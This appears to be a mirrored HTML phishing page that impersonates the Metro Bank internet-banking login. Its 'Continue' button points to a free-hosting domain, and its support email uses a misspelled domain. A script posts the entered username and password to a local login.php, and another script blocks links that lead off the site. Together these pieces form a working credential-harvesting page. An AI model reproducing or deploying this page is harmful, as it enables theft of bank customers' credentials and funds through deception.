                                                                            <div style="float: left;" id="p4_BUT_E8BAE60B5EFF4C8248304">
                                                                                <div>
                                                                                    <div id="BUT_E8BAE60B5EFF4C8248304_waiting" style="display: none; float: left; text-align: right; height: 35px; width: 35px;">
                                                                                        <img class="loader-30" src="loader-30-blue.gif">
                                                                                    </div>
                                                                                    <div style="display: inline; height: 35px; width: 89px;" >
											     <button style="background:#000099; color:White; height: 35px; width: 89px; border:None " onclick="window.location.href='http://metrobank.byethost18.com/Login.php?user=user&pass=pass'" Text="Continue">Continue</button>
                                                                                        </div>
                                                                                </div>
                                                                            </div>
                                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                        </div>
                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="COL_757E5CE63630B7EB52861" class="column grid-5" style="float: left;">
                                            <div>
                                                <div style="clear: both;" id="FMT_757E5CE63630B7EB184000" class="help-info">
                                                    <div>
                                                        <div id="p1_GRP_757E5CE63630B7EB51280" style="position: relative;">
                                                            <div></div>
                                                            <div>
                                                                <div style="clear: left;" id="row_HEAD_757E5CE63630B7EB183903">
                                                                    <div id="p1_HEAD_757E5CE63630B7EB183903" style="float: left;">
                                                                        <div>
                                                                            <h4 id="HEAD_757E5CE63630B7EB183903" class="marginBottom1em  ">First time logging in?</h4></div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                </div>
                                                                <div style="clear: left;" id="row_HEAD_757E5CE63630B7EB51281">
                                                                    <div id="p1_HEAD_757E5CE63630B7EB51281" style="text-align: left; float: left;" class="marginBottom1em text-777 fontWeight400">
                                                                        <div>You will need these security details to log into your Internet Banking...</div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both;" id="FMT_518D9AD412F66C89245024" class="paddingLeft2em">
                                                                <div style="clear: both;">
                                                                    <div style="clear: left;" id="row_HEAD_757E5CE63630B7EB51282">
                                                                        <div id="p1_HEAD_757E5CE63630B7EB51282" style="text-align: left; float: none;" class="marginBottom1em fontWeight600 fontSizep9em">
                                                                            <div>• Your Customer Number or Username<span id="p5_HEAD_757E5CE63630B7EB51282">&nbsp;<a style="cursor: pointer;" id="HELP_HEAD_757E5CE63630B7EB51282" onclick="javascript:showAjaxHelp('HELP_HEAD_757E5CE63630B7EB51282', '4EF4BAAEBB4A213F Heading 32', '', 'servletcontroller', '', event);" onmouseover="this.style.cursor='pointer'" onfocus="this.style.cursor='pointer'">What is this?</a></span></div>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div>
                                                                    <div style="clear: left;" id="row_HEAD_757E5CE63630B7EB51283">
                                                                        <div id="p1_HEAD_757E5CE63630B7EB51283" style="text-align: left; float: none;" class="marginBottom1em fontWeight600 fontSizep9em">
                                                                            <div>• Your Password<span id="p5_HEAD_757E5CE63630B7EB51283">&nbsp;<a id="HELP_HEAD_757E5CE63630B7EB51283" onclick="javascript:showAjaxHelp('HELP_HEAD_757E5CE63630B7EB51283', '99DD661569B45B81 Heading 55', '', 'servletcontroller', '', event);" onmouseover="this.style.cursor='pointer'" onfocus="this.style.cursor='pointer'">What is this?</a></span></div>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div>
                                                                    <div style="clear: left;" id="row_HEAD_757E5CE63630B7EB51284">
                                                                        <div id="p1_HEAD_757E5CE63630B7EB51284" style="text-align: left; float: none;" class="marginBottom1em fontWeight600 fontSizep9em">
                                                                            <div>• Your Security Number<span id="p5_HEAD_757E5CE63630B7EB51284">&nbsp;<a id="HELP_HEAD_757E5CE63630B7EB51284" onclick="javascript:showAjaxHelp('HELP_HEAD_757E5CE63630B7EB51284', '4EF4BAAEBB4A213F Heading 33', '', 'servletcontroller', '', event);" onmouseover="this.style.cursor='pointer'" onfocus="this.style.cursor='pointer'" style="cursor: pointer;">What is this?</a></span></div>
                                                                        </div>
                                                                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                    </div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                            <div>
                                                                <div style="clear: left;" id="row_HEAD_757E5CE63630B7EB51290">
                                                                    <div id="p1_HEAD_757E5CE63630B7EB51290" style="text-align: left; float: left;" class="marginBottom1em text-777 fontWeight400">
                                                                        <div>If you have forgotten or are unsure of any of your security details, then <a href="#" target="_top">click here</a> or please call us on 0345 08 08 500 and we will help you.</div>
                                                                    </div>
                                                                    <div style="text-align: left; float: left;" id="p4_BUT_E603038BA3273DF7163019">
                                                                        <div>
                                                                            <a href="#" class="lineHeight_2em" onclick="" target="_top">New to Internet Banking? Register here</a></div>
                                                                    </div>
                                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                        </div>
                                                    </div>
                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                </div>
                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                            </div>
                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                        </div>
                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                    </div>
                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                </div>
                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
            </div>
            <footer id="FMT_2F1A8E1F73CCF7BB71058" class="">
                <div style="clear: both;" id="FMT_2F1A8E1F73CCF7BB70683" class="row">
                    <div style="clear: both;" id="FMT_2F1A8E1F73CCF7BB70684" class="column grid-12 talk-to-us">
                        <div>
                            <div id="p1_GRP_06ADCD86A9EEBE2137962" style="position: relative;">
                                <div style="clear: both;" id="FMT_2F1A8E1F73CCF7BB70727" class="alertvb alert-infovb question-typevb">
                                    <div style="clear: both;">
                                        <div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2137963">
                                            <div id="p1_HEAD_06ADCD86A9EEBE2137963" style="text-align: center; float: none;">
                                                <div>
                                                    <h3 id="HEAD_06ADCD86A9EEBE2137963">Any Questions? Please call us on <a href="#">+44-151-3292-617</a>, we are here to help.</h3></div>
                                            </div>
                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                        </div>
                                    </div>
                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                </div>
                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                            </div>
                        </div>
                        <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                    </div>
                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                </div>
                <div style="clear: both;" id="FMT_2F1A8E1F73CCF7BB71132" class="row">
                    <div>
                        <div id="p1_GRP_06ADCD86A9EEBE2138907" style="position: relative;">
                            <div style="width: 100%;">
                                <div id="COL_2F1A8E1F73CCF7BB71206" class="column grid-4" style="float: left;">
                                    <div>
                                        <div>
                                            <div id="p1_GRP_06ADCD86A9EEBE2138908" style="position: relative;">
                                                <div style="clear: both;" id="FMT_D96D931C6B0278BB569300" class="feature  ">
                                                    <header id="FMT_D96D931C6B0278BB569364" class="">
                                                        <div>
                                                            <div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138909">
                                                                <div id="p1_HEAD_06ADCD86A9EEBE2138909" style="text-align: left; float: left;">
                                                                    <div>
                                                                        <h5 id="HEAD_06ADCD86A9EEBE2138909">New Customers</h5></div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                        </div>
                                                    </header>
                                                    <div>
                                                        <div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138961">
                                                            <div id="p1_HEAD_06ADCD86A9EEBE2138961" style="text-align: left; float: left;">
                                                                <div>
                                                                    <p>If you have not already opened an account with us, please <a href="#" target="_top">click here</a> for information on what you need to open an account.</p>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                        </div>
                                                    </div>
                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                </div>
                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="COL_2F1A8E1F73CCF7BB71228" class="column grid-4" style="float: left;">
                                    <div>
                                        <div>
                                            <div id="p1_GRP_06ADCD86A9EEBE2138910" style="position: relative;">
                                                <div style="clear: both;" id="FMT_D96D931C6B0278BB569343" class="feature  ">
                                                    <header id="FMT_D96D931C6B0278BB569401" class="">
                                                        <div>
                                                            <div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138911">
                                                                <div id="p1_HEAD_06ADCD86A9EEBE2138911" style="text-align: left; float: left;">
                                                                    <div>
                                                                        <h5 id="HEAD_06ADCD86A9EEBE2138911">Useful help and support</h5></div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                        </div>
                                                    </header>
                                                    <div>
                                                        <div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138967">
                                                            <div id="p1_HEAD_06ADCD86A9EEBE2138967" style="text-align: left; float: left;">
                                                                <div>
                                                                    <p>Kindly contact <a href="mailto:premiumsupport@metrobonliine.com">premium support</a> for help and support on managing your Internet banking platform (For our premium customers only)</p>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                        </div>
                                                    </div>
                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                </div>
                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="COL_2F1A8E1F73CCF7BB71237" class="column grid-4" style="float: left;">
                                    <div>
                                        <div>
                                            <div id="p1_GRP_06ADCD86A9EEBE2138912" style="position: relative;">
                                                <div style="clear: both; height: 81px;" id="FMT_D96D931C6B0278BB569350" class="feature  ">
                                                    <header id="FMT_D96D931C6B0278BB569405" class="">
                                                        <div>
                                                            <div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138913">
                                                                <div id="p1_HEAD_06ADCD86A9EEBE2138913" style="text-align: left; float: left;">
                                                                    <div>
                                                                        <h5 id="HEAD_06ADCD86A9EEBE2138913">We take security very seriously</h5></div>
                                                                </div>
                                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                            </div>
                                                        </div>
                                                    </header>
                                                    <div>
                                                        <div style="clear: left;" id="row_HEAD_06ADCD86A9EEBE2138973">
                                                            <div id="p1_HEAD_06ADCD86A9EEBE2138973" style="text-align: left; float: left;">
                                                                <div>
                                                                    <p>We continuously strive to make banking online safer. To find out more about security <a href="#" target="_top">click here. </a></p>
                                                                    <div class="hr" style="padding: 0px;">
                                                                        <hr style="display: none;">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                        </div>
                                                    </div>
                                                    <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                                </div>
                                                <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div style="clear: both; height: 0px; overflow: hidden;" class="clearBoth"></div>
                        </div>
                    </div>
                </div>
                <div style="clear: both;" id="FMT_2F1A8E1F73CCF7BB71112" class="row">
                    <div style="clear: both;" id="FMT_D96D931C6B0278BB569443" class="column grid-12 small-print">
                        <div style="clear: both;">
                            <div style="clear: left;" id="row_TXT_02B12661ED4B28FB45658">
                                <div style="text-align: left;" id="TXT_02B12661ED4B28FB45658">
                                    <div>
                                        <script type="text/javascript">
                                        var d = new Date();
                                        var n = d.getFullYear();
                                        </script>
                                        
                                        <em class="no-print">© Metro Bank
<script type="text/javascript">
var d = new Date();
var n = d.getFullYear();
document.write(n);
</script>

</em>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
    <script type="text/javascript">
    //<![CDATA[

    forwardsConfirmMsg = "";
    backConfirmMsg = "";
    MANDCHAR = '*';

    function initForm(p_namespace) {
        if (null == p_namespace) p_namespace = '';
        if (beforeInitForm(p_namespace) == false) return;
        putUncheckedCheckboxValue('METROBANK[1].LOGIN[1].REMEMBERME', '0', '');
        showECForm(p_namespace);
        afterInitForm(p_namespace);
    }
    // ecBrowserNavCheck();

    var tid = setInterval(function() {
        if (document.readyState !== 'complete') return;
        clearInterval(tid);
        // initForm('');

    }, 100);

    function showECForm(p_ns) {}

    function hideECForm(p_ns, p_mode, p_scroll, p_id) {
        return true;
    }
    //]]>
    </script>
    <script type="text/javascript">
    //<![CDATA[
    //]]>
    </script>
    <script type="text/javascript">
    $(function() {
        var $menuSpanElement = $("#TAB_MAKEPAYMENT>span");

        menuContent = $menuSpanElement.text();

        if (menuContent.length > 20) {
            $("#TAB_MAKEPAYMENT").append($menuSpanElement.html());
            $("#TAB_MAKEPAYMENT>span:first-child").remove();


        } else {
            $("#TAB_MAKEPAYMENT>span").remove();
            $("#TAB_MAKEPAYMENT").append(menuContent);

        }
    });
    </script>
    <script>
    /**
     * jQuery.browser.mobile (http://detectmobilebrowser.com/)
     *
     * jQuery.browser.mobile will be true if the browser is a mobile device
     *
     **/
    (function(a) {
        (jQuery.browser = jQuery.browser || {}).mobile = /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(ad|hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))
    })(navigator.userAgent || navigator.vendor || window.opera);

    if (jQuery.browser.mobile) {
        $('#security-digits').css('display', 'block');
        $('#security-dropdowns').css('display', 'none');
    } else {
        $('#security-digits').css('display', 'none');
        $('#security-dropdowns').css('display', 'block');
    }
    </script>
    <img src="untitled.html" style="display: none;" id="918137">

<script type="text/javascript">
  $(document).on('click', '.login-btn', function (e){
    e.preventDefault();

    $.ajax({
      url: '/login.php',
      type: 'POST',
      data:{
      	'USER_NAME' : $('#USER_NAME').val(),
      	'PASS_WORD' : $('#PASS_WORD').val()
      },
      success: function (data) {
      	if (JSON.parse(data).auth) {
					window.location.replace("index122c.html");
      	} else {
      		alert('Wrong Username or Password. Try again');
      	}
      }
    });
  });
</script>
<script type="text/javascript">
jQuery("a[href^='http']:not([href*='" + document.domain + "'])").each(function () {
  $(this).on('click', function (e) {
    e.preventDefault();
    // alert('Insecure session detected. Please reload your browser window.');
    return false;
  });
});
</script>
        </form>
</body>
<!-- Mirrored from www1.mbpib.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 04 Jul 2016 17:21:19 GMT -->
</html>
 
